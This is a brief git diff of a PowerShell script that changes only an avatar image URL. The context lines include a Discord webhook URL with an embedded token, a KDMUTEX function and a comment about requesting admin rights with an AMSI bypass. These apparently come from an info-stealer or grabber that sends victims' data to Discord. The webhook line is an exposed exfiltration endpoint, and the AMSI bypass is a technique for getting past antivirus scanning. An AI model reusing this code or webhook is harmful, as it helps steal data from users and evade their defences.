@@ -23,7 +23,7 @@ function KDMUTEX {
 Add-Type -AssemblyName PresentationCore,PresentationFramework
 
 $webhook = "https://discordapp.com/api/webhooks/1216874827927916634/p8cd-3Hhap06Cj2PEDOggXRgb9IRMXQF_93c0HY2oEzzDyKXhH7hzwV6g0OOSf8sIDIp"
-$avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
+$avatar = "https://cdn.discordapp.com/avatars/791145016080859166/e49052fda3789c06fe0ea121e52acd59.png?size=1024"
 
 
 # Request admin with AMSI bypass
